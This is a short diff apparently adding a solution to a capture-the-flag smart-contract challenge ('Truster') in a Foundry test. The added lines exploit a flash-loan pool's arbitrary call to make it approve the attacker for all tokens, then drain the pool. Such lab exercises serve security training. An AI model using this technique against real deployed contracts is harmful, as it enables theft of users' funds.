@@ -41,6 +41,16 @@ contract Truster is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
+        trusterLenderPool.flashLoan(
+            0, // Actually didn't need to borrow any tokens
+            address(this), // Borrower
+            address(dvt), // Target asset
+            abi.encodeWithSignature("approve(address,uint256)", attacker, type(uint256).max) // Let the pool execute the function which allow attacker to transfer all tokens from the pool
+        );
+        // Transfer all tokens from the pool to the attacker
+        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);
+        vm.stopPrank();
 
         /**
          * EXPLOIT END *
